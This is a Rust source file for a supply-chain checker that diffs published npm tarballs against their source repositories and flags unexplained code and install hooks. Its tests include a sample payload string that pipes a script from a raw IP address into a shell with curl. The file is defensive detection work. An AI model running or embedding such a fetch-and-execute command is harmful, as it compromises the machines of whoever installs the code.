//! `postmortem ghost` — does what npm serves match the source it claims?
//!
//! Every analyzer postmortem has reads code that exists somewhere. The attacks
//! that hurt most put their payload in exactly one place: the **published
//! tarball**. event-stream's `flatmap-stream`, ua-parser-js, the xz backdoor's
//! release tarball — the repository everyone reviewed was clean, the artifact
//! everyone installed was not.
//!
//! So for each npm dependency this fetches both sides — the registry tarball and
//! the repository at the commit (`gitHead`) or tag the version was published
//! from — and diffs them file by file. The analyzers then run on **only the
//! difference**, and a finding whose evidence also appears in the source is
//! dropped: a URL that a bundle copied out of `src/` is not a ghost. What is
//! left is code nobody could have reviewed.
//!
//! A package that cannot be compared (no repo, private repo, no matching tag) is
//! `unverifiable` — never `identical`.

use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Mutex;
use std::sync::atomic::{AtomicUsize, Ordering};

use anyhow::{Result, bail};
use owo_colors::OwoColorize;
use serde::Serialize;

use crate::model::{Category, Dependency, Finding, Severity};
use crate::resolve::{self, RepoRef, Resolver};
use crate::{analyze, gochi, settings};

/// A tarball is attacker-controlled; refuse the absurd before writing it.
const MAX_TARBALL: u64 = 50 << 20;
/// Parallel package checks. Each is two network fetches plus a `git` process,
/// so a few in flight hide the latency without hammering the registry.
const WORKERS: usize = 4;
/// The hooks npm runs when a registry package is installed. `prepare` only runs
/// for git dependencies, so a registry tarball's copy of it never executes.
const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];

/// Worst first — the order the report is sorted in.
#[derive(Serialize, Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum Verdict {
    /// The tarball carries code or an install hook the source does not explain.
    Ghost,
    /// Could not be compared; says nothing either way.
    Unverifiable,
    /// Files differ (a build step ran), but nothing in the difference is
    /// unexplained.
    Rebuilt,
    /// Every published file is byte-identical to the source.
    Identical,
}

/// An install hook the tarball runs that the source's `package.json` does not
/// declare (or declares differently).
#[derive(Serialize, Debug, Clone)]
pub struct ScriptDiff {
    pub hook: String,
    pub published: String,
    pub source: Option<String>,
}

#[derive(Serialize, Debug)]
pub struct PkgReport {
    pub name: String,
    pub version: String,
    pub verdict: Verdict,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub repo: Option<String>,
    /// The commit or tag the tarball was compared against.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub git_ref: Option<String>,
    /// Why an `unverifiable` package could not be compared.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub notes: Vec<String>,
    pub identical_files: usize,
    pub modified: Vec<String>,
    pub only_in_tarball: Vec<String>,
    pub scripts: Vec<ScriptDiff>,
    /// The source declares a build step, so files it lacks are expected.
    pub has_build_step: bool,
    /// Findings in the difference that the source does not account for.
    pub findings: Vec<Finding>,
}

impl PkgReport {
    fn new(dep: &Dependency) -> Self {
        PkgReport {
            name: dep.name.clone(),
            version: dep.version.clone(),
            verdict: Verdict::Unverifiable,
            repo: None,
            git_ref: None,
            reason: None,
            notes: Vec::new(),
            identical_files: 0,
            modified: Vec::new(),
            only_in_tarball: Vec::new(),
            scripts: Vec::new(),
            has_build_step: false,
            findings: Vec::new(),
        }
    }

    fn unverifiable(mut self, why: impl Into<String>) -> Self {
        self.verdict = Verdict::Unverifiable;
        self.reason = Some(why.into());
        self
    }
}

pub fn git_available() -> bool {
    Command::new("git")
        .arg("--version")
        .output()
        .is_ok_and(|o| o.status.success())
}

/// Check every package, `WORKERS` at a time, inside a scratch workspace that is
/// deleted afterwards. Returned worst-first.
pub fn check_all(resolver: &Resolver, deps: &[Dependency], animate: bool) -> Result<Vec<PkgReport>> {
    let work = Workspace::new()?;
    let bar = gochi::Loader::start(deps.len() as u64, animate);
    bar.step("fetching tarballs + sources");
    let next = AtomicUsize::new(0);
    let out = Mutex::new(Vec::with_capacity(deps.len()));
    std::thread::scope(|s| {
        for _ in 0..WORKERS.min(deps.len()) {
            s.spawn(|| {
                while let Some(dep) = deps.get(next.fetch_add(1, Ordering::Relaxed)) {
                    bar.step(format!("{}@{}", dep.name, dep.version));
                    let dir = work.0.join(sanitize(&format!("{}@{}", dep.name, dep.version)));
                    let r = check(resolver, dep, &dir);
                    let _ = std::fs::remove_dir_all(&dir); // disk stays flat on big trees
                    out.lock().unwrap().push(r);
                    bar.inc();
                }
            });
        }
    });
    let mut out = out.into_inner().unwrap();
    out.sort_by(|a, b| (a.verdict, &a.name).cmp(&(b.verdict, &b.name)));
    let ghosts = out.iter().filter(|r| r.verdict == Verdict::Ghost).count();
    bar.finish(
        if ghosts > 0 { gochi::Mood::Bad } else { gochi::Mood::Happy },
        format!("compared {} package(s), {ghosts} ghost(s)", out.len()),
    );
    Ok(out)
}

/// One package: manifest → tarball → source at the published ref → diff.
fn check(resolver: &Resolver, dep: &Dependency, dir: &Path) -> PkgReport {
    let r = PkgReport::new(dep);
    let manifest = match resolver.npm_manifest(&dep.name, &dep.version) {
        Ok(Some(m)) => m,
        Ok(None) => return r.unverifiable("not on the npm registry"),
        Err(e) => return r.unverifiable(format!("registry unreachable: {e}")),
    };
    let Some(repo) = resolve::npm_manifest_repo(&manifest) else {
        return r.unverifiable("declares no repository on a known host");
    };
    let mut r = r;
    r.repo = Some(format!("{}/{}", repo.host, repo.slug()));

    let Some(url) = manifest
        .pointer("/dist/tarball")
        .and_then(|v| v.as_str())
        .map(String::from)
        .or_else(|| dep.resolved_url.clone())
    else {
        return r.unverifiable("the registry lists no tarball");
    };
    let published = match fetch_tarball(resolver, &url, dir) {
        Ok(p) => p,
        Err(e) => return r.unverifiable(format!("tarball: {e}")),
    };

    let source = dir.join("source");
    let git_head = manifest.get("gitHead").and_then(|v| v.as_str());
    match fetch_source(&repo, git_head, &dep.name, &dep.version, &source) {
        Ok((git_ref, notes)) => {
            r.git_ref = Some(git_ref);
            r.notes = notes;
        }
        Err(e) => return r.unverifiable(e.to_string()),
    }
    let subdir = manifest
        .pointer("/repository/directory")
        .and_then(|v| v.as_str());
    let Some(pkg_dir) = locate_package(&source, subdir, &dep.name) else {
        return r.unverifiable(format!(
            "no package.json named {} in {}",
            dep.name,
            repo.slug()
        ));
    };
    compare(&published, &pkg_dir, &dir.join("delta"), &mut r);
    // A monorepo builds from its root (esbuild's `npm/esbuild` has no scripts;
    // the root Makefile writes its `lib/main.js`).
    if !r.has_build_step && has_build_step(&source) {
        r.has_build_step = true;
        r.verdict = verdict(&r);
    }
    r
}

/// Download and unpack the tarball; returns the package root inside it.
///
/// Unpacked with the system `tar` (present on macOS, Linux and Windows 10+),
/// which refuses `..` and absolute member names by default — the archive is
/// hostile by premise.
// ponytail: no cap on the *unpacked* size; a gzip bomb under 50 MiB can still
// fill the disk. Stream through a size-limited reader if that ever matters.
fn fetch_tarball(resolver: &Resolver, url: &str, dir: &Path) -> Result<PathBuf> {
    let Some(bytes) = resolver.get_bytes(url, MAX_TARBALL)? else {
        bail!("404 at {url}");
    };
    let out = dir.join("published");
    std::fs::create_dir_all(&out)?;
    let tgz = dir.join("package.tgz");
    std::fs::write(&tgz, bytes)?;
    let ok = Command::new("tar")
        .arg("-xzf")
        .arg(&tgz)
        .arg("-C")
        .arg(&out)
        .arg("--no-same-owner")
        .output()
        .is_ok_and(|o| o.status.success());
    if !ok {
        bail!("could not unpack {url}");
    }
    // npm packs everything under one top directory, almost always `package/`.
    let mut entries: Vec<_> = std::fs::read_dir(&out)?.flatten().collect();
    Ok(match entries.as_slice() {
        [one] if one.path().is_dir() => entries.remove(0).path(),
        _ => out,
    })
}

/// Check out the source the version was published from: `gitHead` when the
/// registry recorded it, else the release tag. Returns the ref used, plus notes
/// worth surfacing (a `gitHead` the repo does not have is one).
fn fetch_source(
    repo: &RepoRef,
    git_head: Option<&str>,
    name: &str,
    version: &str,
    dest: &Path,
) -> Result<(String, Vec<String>)> {
    let url = format!("https://{}/{}.git", repo.host, repo.slug());
    std::fs::create_dir_all(dest)?;
    if !git(dest, &["init", "--quiet"]) {
        bail!("git init failed");
    }
    let mut notes = Vec::new();
    if let Some(sha) = git_head.filter(|s| s.len() >= 7) {
        if fetch_ref(dest, &url, sha) {
            return Ok((sha.chars().take(12).collect(), notes));
        }
        notes.push(format!(
            "published from commit {}, which {} does not have (unpushed or force-pushed away)",
            &sha[..sha.len().min(12)],
            repo.slug()
        ));
    }
    let Some(tags) = remote_tags(&url) else {
        bail!("{} is unreachable (private, renamed or deleted)", repo.slug());
    };
    for tag in tag_candidates(name, version) {
        if tags.contains(&tag) && fetch_ref(dest, &url, &format!("refs/tags/{tag}")) {
            return Ok((tag, notes));
        }
    }
    if git_head.is_none() {
        bail!("published without a gitHead, and {} has no tag for {version}", repo.slug())
    }
    bail!("{} has no tag for {version}", repo.slug())
}

/// The tag spellings releases actually use, in the order they are most common.
fn tag_candidates(name: &str, version: &str) -> Vec<String> {
    let short = name.rsplit('/').next().unwrap_or(name);
    let mut c = vec![
        format!("v{version}"),
        version.to_string(),
        format!("{name}@{version}"),
        format!("{short}@{version}"),
        format!("{short}-v{version}"),
        format!("{short}-{version}"),
    ];
    c.dedup();
    c
}

/// `git` in `dir`, never prompting for credentials (a private repo must fail,
/// not hang) and never pulling LFS objects.
fn git(dir: &Path, args: &[&str]) -> bool {
    Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_LFS_SKIP_SMUDGE", "1")
        .output()
        .is_ok_and(|o| o.status.success())
}

fn fetch_ref(dir: &Path, url: &str, r: &str) -> bool {
    git(dir, &["fetch", "--quiet", "--depth", "1", url, r])
        && git(
            dir,
            &["-c", "advice.detachedHead=false", "checkout", "--quiet", "FETCH_HEAD"],
        )
}

fn remote_tags(url: &str) -> Option<HashSet<String>> {
    let out = Command::new("git")
        .args(["ls-remote", "--tags", "--refs", url])
        .env("GIT_TERMINAL_PROMPT", "0")
        .output()
        .ok()
        .filter(|o| o.status.success())?;
    Some(
        String::from_utf8_lossy(&out.stdout)
            .lines()
            .filter_map(|l| l.split("refs/tags/").nth(1))
            .map(String::from)
            .collect(),
    )
}

/// The directory in the checkout that holds this package: the manifest's
/// `repository.directory`, the root, or — for a monorepo that does not say —
/// the first `package.json` carrying this name.
fn locate_package(source: &Path, subdir: Option<&str>, name: &str) -> Option<PathBuf> {
    let named = |dir: &Path| {
        std::fs::read_to_string(dir.join("package.json"))
            .ok()
            .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
            .is_some_and(|v| v.get("name").and_then(|n| n.as_str()) == Some(name))
    };
    if let Some(d) = subdir.map(|d| source.join(d.trim_matches('/')))
        && d.join("package.json").is_file()
    {
        return Some(d);
    }
    if named(source) {
        return Some(source.to_path_buf());
    }
    walkdir::WalkDir::new(source)
        .max_depth(5)
        .into_iter()
        .filter_entry(|e| !matches!(e.file_name().to_str(), Some("node_modules" | ".git")))
        .flatten()
        .filter(|e| e.file_name() == "package.json")
        .filter_map(|e| e.path().parent().map(Path::to_path_buf))
        .find(|d| named(d))
}

/// Diff the unpacked tarball against the package's source directory, and run
/// the analyzers over what differs. Pure filesystem — no network — so it is the
/// part the tests drive.
fn compare(published: &Path, source: &Path, delta: &Path, r: &mut PkgReport) {
    r.has_build_step = has_build_step(source);
    for e in walkdir::WalkDir::new(published)
        .follow_links(false)
        .into_iter()
        .flatten()
        .filter(|e| e.file_type().is_file())
    {
        let Ok(rel) = e.path().strip_prefix(published) else {
            continue;
        };
        let rel_s = rel.to_string_lossy().replace('\\', "/");
        if rel_s == "package.json" {
            r.scripts = script_diffs(e.path(), &source.join("package.json"), published);
            continue;
        }
        let Ok(ours) = std::fs::read(e.path()) else {
            continue;
        };
        match std::fs::read(source.join(rel)) {
            Ok(theirs) if normalize(&theirs) == normalize(&ours) => {
                r.identical_files += 1;
                continue;
            }
            Ok(_) => r.modified.push(rel_s),
            Err(_) => r.only_in_tarball.push(rel_s),
        }
        let to = delta.join(rel);
        if let Some(p) = to.parent() {
            let _ = std::fs::create_dir_all(p);
        }
        let _ = std::fs::write(&to, &ours);
    }
    r.modified.sort();
    r.only_in_tarball.sort();

    if !r.modified.is_empty() || !r.only_in_tarball.is_empty() {
        // Anything the source already contains (the same URL, the same
        // behaviour) is explained: the build copied it, nobody slipped it in.
        let explained: HashSet<(String, String)> = analyze::scan_source_tree(source)
            .iter()
            .map(finding_key)
            .collect();
        // One separator on both sides: on Windows the analyzers report
        // `C:\…\delta\lib\x.js`, which a `…\delta/` prefix never matches.
        let prefix = format!("{}/", delta.display()).replace('\\', "/");
        r.findings = analyze::scan_source_tree(delta)
            .into_iter()
            .filter(|f| !explained.contains(&finding_key(f)))
            .map(|mut f| {
                f.dependency = r.name.clone();
                if let Some(loc) = &f.location {
                    let loc = loc.replace('\\', "/");
                    f.location = Some(loc.strip_prefix(&prefix).unwrap_or(&loc).to_string());
                }
                f
            })
            .collect();
        r.findings.sort_by(|a, b| {
            (b.severity, &a.location, &a.detail).cmp(&(a.severity, &b.location, &b.detail))
        });
        r.findings.dedup_by(|a, b| {
            (&a.location, &a.detail, &a.evidence) == (&b.location, &b.detail, &b.evidence)
        });
    }
    r.verdict = verdict(r);
}

fn verdict(r: &PkgReport) -> Verdict {
    if !r.scripts.is_empty() || r.findings.iter().any(|f| r.counts(f)) {
        Verdict::Ghost
    } else if r.modified.is_empty() && r.only_in_tarball.is_empty() {
        Verdict::Identical
    } else {
        Verdict::Rebuilt
    }
}

/// Line endings are the one difference publishing legitimately introduces to
/// hand-written files (a Windows publisher, `core.autocrlf`).
fn normalize(b: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(b.len());
    for (i, &c) in b.iter().enumerate() {
        if !(c == b'\r' && b.get(i + 1) == Some(&b'\n')) {
            out.push(c);
        }
    }
    out
}

fn finding_key(f: &Finding) -> (String, String) {
    (
        f.category.as_str().to_string(),
        f.evidence.clone().unwrap_or_else(|| f.detail.clone()),
    )
}

impl PkgReport {
    /// Does this finding make the package a ghost?
    ///
    /// Hand-written code the source lacks: any medium finding. Build output is
    /// different — bundles inline third-party code the repo never contains, and
    /// minified parsers are full of `fromCharCode` and escape runs (measured:
    /// prettier's plugins score *critical* on those alone). There it takes a
    /// high finding, and obfuscation only counts in the event-stream shape:
    /// code that *executes* (`eval`/`Function`) *and* an encoded blob. Either
    /// alone is a polyfill (`Function('return this')`) or a parser table.
    /// Vendored third-party code (next's `dist/compiled/`) is a supply chain of
    /// its own, and its regex noise is worse still: only critical counts.
    // ponytail: "build output" is a guess (build script or dist-like path); a
    // medium-severity payload in a built package slips through. Rebuilding the
    // package locally and diffing against that would close it.
    fn counts(&self, f: &Finding) -> bool {
        let path = f.location.as_deref().unwrap_or("");
        let segs = || path.split('/');
        let vendored = segs().any(|s| {
            matches!(s, "compiled" | "vendor" | "vendored" | "third_party" | "node_modules")
        });
        let built = vendored
            || self.has_build_step
            || segs().any(|s| {
                matches!(s, "dist" | "build" | "umd" | "bundle" | "bundles" | "cjs" | "esm")
            })
            || path.contains(".min.")
            || path.contains(".bundle.");
        if !built {
            return f.severity >= Severity::Medium;
        }
        let floor = if vendored { Severity::Critical } else { Severity::High };
        let d = f.detail.as_str();
        f.severity >= floor
            && (f.category != Category::Obfuscation
                || ((d.contains("eval()") || d.contains("Function() constructor"))
                    && (d.contains("base64") || d.contains("run") || d.contains("high-entropy"))))
    }
}

/// Does `dir` turn its source into something else before publishing: a build
/// script in `package.json`, or the config of a compiler or bundler?
fn has_build_step(dir: &Path) -> bool {
    const SCRIPTS: &[&str] = &[
        "build", "prepublishOnly", "prepublish", "prepack", "prepare", "compile", "bundle", "dist",
    ];
    const CONFIGS: &[&str] = &[
        "Makefile", "tsconfig.json", "rollup.config", "webpack.config", "vite.config",
        "tsup.config", "esbuild.config", "babel.config", ".babelrc", "gulpfile", "Gruntfile",
    ];
    let scripts = std::fs::read_to_string(dir.join("package.json"))
        .ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .and_then(|v| v.get("scripts").and_then(|s| s.as_object()).cloned())
        .is_some_and(|s| s.keys().any(|k| SCRIPTS.contains(&k.as_str())));
    scripts
        || std::fs::read_dir(dir).is_ok_and(|rd| {
            rd.flatten().any(|e| {
                let n = e.file_name();
                let n = n.to_string_lossy();
                CONFIGS.iter().any(|c| n == *c || n.starts_with(&format!("{c}.")))
            })
        })
}

/// Install hooks the published `package.json` runs that the source's does not.
fn script_diffs(published: &Path, source: &Path, root: &Path) -> Vec<ScriptDiff> {
    let read = |p: &Path| {
        std::fs::read_to_string(p)
            .ok()
            .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
    };
    let Some(pubj) = read(published) else {
        return Vec::new();
    };
    let srcj = read(source);
    let mut out = Vec::new();
    for &hook in INSTALL_HOOKS {
        let Some(p) = pubj.pointer(&format!("/scripts/{hook}")).and_then(|v| v.as_str()) else {
            continue;
        };
        // npm itself adds this at publish time to any package with a
        // binding.gyp and no install script — the only hook it ever invents.
        if hook == "install" && p == "node-gyp rebuild" && root.join("binding.gyp").is_file() {
            continue;
        }
        let s = srcj
            .as_ref()
            .and_then(|j| j.pointer(&format!("/scripts/{hook}")))
            .and_then(|v| v.as_str());
        if s != Some(p) {
            out.push(ScriptDiff {
                hook: hook.into(),
                published: p.into(),
                source: s.map(String::from),
            });
        }
    }
    out
}

fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '.' || c == '-' { c } else { '_' })
        .collect()
}

/// `~/.postmortem/ghost/<pid>`, removed on drop — including on a panic or `?`.
struct Workspace(PathBuf);

impl Workspace {
    fn new() -> Result<Self> {
        let base = settings::base_dir()
            .ok_or_else(|| anyhow::anyhow!("cannot determine $HOME for the workspace"))?;
        let dir = base.join("ghost").join(std::process::id().to_string());
        std::fs::create_dir_all(&dir)?;
        Ok(Workspace(dir))
    }
}

impl Drop for Workspace {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

// --- output -------------------------------------------------------------------

pub fn count(reports: &[PkgReport], v: Verdict) -> usize {
    reports.iter().filter(|r| r.verdict == v).count()
}

pub fn to_json(reports: &[PkgReport], path: &str, skipped: usize) -> serde_json::Value {
    serde_json::json!({
        "path": path,
        "ecosystem": "npm",
        "summary": {
            "packages": reports.len(),
            "ghost": count(reports, Verdict::Ghost),
            "unverifiable": count(reports, Verdict::Unverifiable),
            "rebuilt": count(reports, Verdict::Rebuilt),
            "identical": count(reports, Verdict::Identical),
            "skipped_not_npm": skipped,
        },
        "packages": reports,
    })
}

pub fn render(reports: &[PkgReport], path: &str, skipped: usize) {
    println!(
        "\n{} {} {}\n",
        "ghost".bold(),
        path.dimmed(),
        "· published tarball vs source".dimmed()
    );
    let width = reports
        .iter()
        .map(|r| r.name.len() + r.version.len() + 1)
        .max()
        .unwrap_or(0);
    for r in reports {
        let id = format!("{}@{}", r.name, r.version);
        let at = match (&r.repo, &r.git_ref) {
            (Some(repo), Some(g)) => format!("{repo}@{g}"),
            (Some(repo), None) => repo.clone(),
            _ => String::new(),
        };
        let (mark, what) = match r.verdict {
            Verdict::Ghost => (
                "☠".red().bold().to_string(),
                format!(
                    "{} unexplained finding(s), {} script(s) not in source",
                    r.findings.iter().filter(|f| r.counts(f)).count(),
                    r.scripts.len()
                )
                .red()
                .to_string(),
            ),
            Verdict::Unverifiable => (
                "?".yellow().to_string(),
                r.reason.clone().unwrap_or_default().yellow().to_string(),
            ),
            Verdict::Rebuilt => (
                "≈".cyan().to_string(),
                format!(
                    "{} file(s) differ, nothing unexplained",
                    r.modified.len() + r.only_in_tarball.len()
                ),
            ),
            Verdict::Identical => (
                "✓".green().to_string(),
                format!("{} file(s) identical", r.identical_files),
            ),
        };
        println!("  {mark} {id:<width$}  {what}  {}", at.dimmed());
        for n in &r.notes {
            println!("      {} {}", "!".yellow(), n.yellow());
        }
        if r.verdict != Verdict::Ghost {
            continue;
        }
        for s in &r.scripts {
            let was = match &s.source {
                Some(src) => format!("source has `{src}`"),
                None => "not in source".into(),
            };
            println!(
                "      {} {}: `{}` ({was})",
                "script".red(),
                s.hook.bold(),
                s.published
            );
        }
        for f in r.findings.iter().filter(|f| r.counts(f)).take(15) {
            let origin = match f.location.as_deref() {
                Some(l) if r.only_in_tarball.iter().any(|p| l.starts_with(p.as_str())) => {
                    format!("+ {l}")
                }
                Some(l) => format!("~ {l}"),
                None => String::new(),
            };
            let ev = f
                .evidence
                .as_deref()
                .map(|e| format!(" [{}]", e.trim()))
                .unwrap_or_default();
            println!(
                "      {} {} {}: {}{}",
                origin.bold(),
                f.category.as_str().red(),
                format!("({:?})", f.severity).to_lowercase().dimmed(),
                f.detail,
                ev.dimmed()
            );
        }
    }
    println!(
        "\n  {} ghost · {} unverifiable · {} rebuilt · {} identical{}",
        count(reports, Verdict::Ghost).to_string().red().bold(),
        count(reports, Verdict::Unverifiable).to_string().yellow(),
        count(reports, Verdict::Rebuilt).to_string().cyan(),
        count(reports, Verdict::Identical).to_string().green(),
        if skipped > 0 {
            format!(" · {skipped} non-npm skipped").dimmed().to_string()
        } else {
            String::new()
        }
    );
    println!(
        "  {}",
        "+ only in the tarball · ~ differs from source".dimmed()
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tree(root: &Path, files: &[(&str, &str)]) {
        for (p, c) in files {
            let f = root.join(p);
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(f, c).unwrap();
        }
    }

    fn run(published: &[(&str, &str)], source: &[(&str, &str)]) -> PkgReport {
        // A counter, not a timestamp: parallel tests can share a clock tick.
        static SEQ: AtomicUsize = AtomicUsize::new(0);
        let base = std::env::temp_dir().join(format!(
            "pm-ghost-{}-{}",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        tree(&base.join("pub"), published);
        tree(&base.join("src"), source);
        let dep = Dependency {
            name: "pkg".into(),
            version: "1.0.0".into(),
            ecosystem: crate::model::Ecosystem::Node,
            scope: crate::model::Scope::Prod,
            licenses: Vec::new(),
            license_source: crate::model::LicenseSource::Unknown,
            direct: true,
            resolved_url: None,
            integrity: None,
            parents: Vec::new(),
        };
        let mut r = PkgReport::new(&dep);
        compare(&base.join("pub"), &base.join("src"), &base.join("delta"), &mut r);
        let _ = std::fs::remove_dir_all(&base);
        r
    }

    const PKG: &str = r#"{"name":"pkg","scripts":{"test":"x"}}"#;

    #[test]
    fn identical_when_every_file_matches_even_across_crlf() {
        let r = run(
            &[("package.json", PKG), ("index.js", "module.exports = 1;\r\n")],
            &[("package.json", PKG), ("index.js", "module.exports = 1;\n")],
        );
        assert_eq!(r.verdict, Verdict::Identical);
        assert_eq!(r.identical_files, 1);
    }

    #[test]
    fn a_file_only_in_the_tarball_that_phones_home_is_a_ghost() {
        let payload = "require('child_process').exec('curl http://185.62.57.12/x.sh | sh');";
        let r = run(
            &[("package.json", PKG), ("index.js", "module.exports = 1;\n"), ("lib/setup.js", payload)],
            &[("package.json", PKG), ("index.js", "module.exports = 1;\n")],
        );
        assert_eq!(r.verdict, Verdict::Ghost, "{:#?}", r.findings);
        assert_eq!(r.only_in_tarball, vec!["lib/setup.js"]);
        assert!(r.findings.iter().all(|f| f.location.as_deref().unwrap_or("").starts_with("lib/setup.js")));
    }

    #[test]
    fn build_output_whose_findings_come_from_source_is_only_rebuilt() {
        let src = "fetch('https://api.example-service.io/v1');\n";
        let r = run(
            &[("package.json", PKG), ("dist/index.js", "var a=fetch('https://api.example-service.io/v1');")],
            &[("package.json", PKG), ("src/index.js", src)],
        );
        assert_eq!(r.verdict, Verdict::Rebuilt, "{:#?}", r.findings);
    }

    const BUILT: &str = r#"{"name":"pkg","scripts":{"build":"rollup -c"}}"#;

    #[test]
    fn decode_only_obfuscation_in_a_built_package_is_just_a_bundle() {
        // prettier's plugins: a parser's escape tables, nothing executed.
        let parser = format!(
            "var t=String.fromCharCode(a.charCodeAt(0)^1,b.charCodeAt(1));var s=\"{}\";",
            "\\x41\\x42\\x43\\x44".repeat(40)
        );
        let r = run(
            &[("package.json", BUILT), ("plugins/flow.js", &parser)],
            &[("package.json", BUILT), ("src/index.js", "export default 1;\n")],
        );
        assert_ne!(r.verdict, Verdict::Ghost, "{:#?}", r.findings);
    }

    #[test]
    fn a_global_this_polyfill_is_not_a_payload() {
        let polyfill = "var g=Function('return this')();var c=String.fromCharCode(s.charCodeAt(0));";
        let r = run(
            &[("package.json", BUILT), ("dist/polyfills/nomodule.js", polyfill)],
            &[("package.json", BUILT), ("src/index.js", "export default 1;\n")],
        );
        assert_ne!(r.verdict, Verdict::Ghost, "{:#?}", r.findings);
    }

    #[test]
    fn event_stream_shaped_payload_is_a_ghost_even_in_a_built_package() {
        let payload = std::fs::read_to_string(
            "tests/fixtures/malicious-node/node_modules/flatmap-stream/index.js",
        )
        .unwrap();
        let r = run(
            &[("package.json", BUILT), ("index.min.js", &payload)],
            &[("package.json", BUILT), ("index.js", "module.exports = 1;\n")],
        );
        assert_eq!(r.verdict, Verdict::Ghost, "{:#?}", r.findings);
    }

    #[test]
    fn an_install_hook_the_source_never_declared_is_a_ghost() {
        let r = run(
            &[("package.json", r#"{"name":"pkg","scripts":{"postinstall":"node x.js"}}"#)],
            &[("package.json", PKG)],
        );
        assert_eq!(r.verdict, Verdict::Ghost);
        assert_eq!(r.scripts[0].hook, "postinstall");
        assert!(r.scripts[0].source.is_none());
    }

    #[test]
    fn npms_own_node_gyp_hook_is_not_a_ghost() {
        let r = run(
            &[
                ("package.json", r#"{"name":"pkg","scripts":{"install":"node-gyp rebuild"}}"#),
                ("binding.gyp", "{}"),
            ],
            &[("package.json", PKG), ("binding.gyp", "{}")],
        );
        assert_eq!(r.verdict, Verdict::Identical);
    }

    #[test]
    fn tag_spellings_cover_scoped_monorepo_releases() {
        let c = tag_candidates("@babel/core", "7.1.0");
        assert!(c.contains(&"v7.1.0".to_string()));
        assert!(c.contains(&"@babel/core@7.1.0".to_string()));
        assert!(c.contains(&"core@7.1.0".to_string()));
    }
}
